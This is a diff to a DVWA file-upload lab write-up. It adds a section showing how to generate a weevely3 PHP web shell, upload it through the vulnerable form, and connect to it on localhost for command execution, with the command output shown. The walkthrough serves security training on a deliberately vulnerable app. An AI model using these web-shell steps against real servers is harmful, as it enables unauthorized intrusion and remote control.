@@ -37,6 +37,8 @@ The consequences of unrestricted file upload can vary, including complete system
 
 **Objective**: Execute any PHP function of your choosing on the target system (such as `phpinfo()`	or `system()`) thanks to this file upload vulnerability.
 
+> If you get the "**The PHP module GD is not installed**" check the solution [here](https://youtu.be/K7XBQWAZdZ4).
+
 ## Security: Low
 
 > _Low level will not check the contents of the file being uploaded in any way. It relies only on trust._
@@ -102,6 +104,40 @@ if( isset( $_POST[ 'Upload' ] ) ) {
     ```
 
 > If this was a remote webserver, and not hosted on our PC, we would gain access to the actual webserver where we could further enumerate the network, pivot, or perform privilege escalation.
+
+### Weevely3
+
+We can also use [`weevely3`](https://github.com/epinna/weevely3) to get a reverse shell.
+
+1. Generate the shell:
+
+    ```shell
+    ./weevely.py generate test123 ~/dvwa/weevely.php
+    Generated '/home/kali/dvwa/weevely.php' with password 'test123' of 688 byte size.
+    ```
+
+2. Upload it to the webserver:
+
+    ![](weevely_upload.png)
+
+3. Call it through terminal:
+
+    ```shell
+     sudo /opt/weevely3/weevely.py http://127.0.0.1:42001/hackable/uploads/weevely.php test123
+    [+] weevely 4.0.1
+
+    [+] Target:     127.0.0.1:42001
+    [+] Session:    /root/.weevely/sessions/127.0.0.1/weevely_0.session
+
+    [+] Browse the filesystem or execute commands starts the connection
+    [+] to the target. Type :help for more information.
+
+    weevely> ls
+    dvwa_email.png
+    php-reverse-shell.php
+    php-reverse-shell.php.png
+    weevely.php
+    ```
 
 ## Security: Medium
 
